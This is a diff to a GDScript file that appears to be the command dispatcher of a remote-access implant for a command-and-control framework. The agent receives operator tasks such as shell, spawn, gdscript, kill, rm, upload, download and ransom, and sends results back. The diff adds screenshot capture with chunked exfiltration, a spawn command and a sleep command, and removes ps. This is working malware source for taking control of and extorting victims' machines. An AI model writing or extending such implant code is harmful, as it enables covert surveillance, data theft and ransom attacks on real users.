@@ -8,11 +8,12 @@ signal whoami
 signal exit
 signal ransom
 signal post_response
-signal ps
 signal ls
 signal kill
 signal rm
 signal shell
+signal sleep
+signal spawn
 signal gdscript
 signal upload
 signal upload_start
@@ -20,6 +21,9 @@ signal upload_chunk
 signal download
 signal download_start
 signal download_chunk
+signal screenshot
+signal screenshot_start
+signal screenshot_chunk
 
 func _ready():
 	parent = $".".get_parent()
@@ -49,6 +53,9 @@ func _on_Agent_tasking(data):
 			print("task: ", task)
 
 			match task.get("command"):
+				"screenshot":
+					task_id_to_last_action[task.get("id")] = "screenshot"
+					emit_signal("screenshot", task)
 				"download":
 					task_id_to_last_action[task.get("id")] = "download"
 					emit_signal("download", task)
@@ -57,12 +64,14 @@ func _on_Agent_tasking(data):
 					emit_signal("upload", task)
 				"shell":
 					emit_signal("shell", task)
+				"spawn":
+					emit_signal("spawn", task)
 				"gdscript":
 					emit_signal("gdscript", task)
 				"kill":
 					emit_signal("kill", task)
-				"ps":
-					emit_signal("ps", task)
+				"sleep":
+					emit_signal("sleep", task)
 				"ls":
 					emit_signal("ls", task)
 				"rm":
@@ -110,8 +119,17 @@ func _on_Agent_post_response(data):
 				"download_chunk":
 					emit_signal("download_chunk", response)
 					task_id_to_last_action[task_id ] = "download_chunk"
+				"screenshot":
+					if response.has("file_id"):
+						emit_signal("screenshot_start", response)
+						task_id_to_last_action[task_id ] = "download_chunk"
+					else:
+						print("Bad screenshot response: ", response)
+				"screenshot_chunk":
+					emit_signal("screenshot_chunk", response)
+					task_id_to_last_action[task_id ] = "screenshot_chunk"
 				_:
-					print("unknown download last action: ", task_id_to_last_action.get(task_id))
+					print("unknown last action: ", task_id_to_last_action.get(task_id))
 		else:
 			print("failed response: ", response)
 
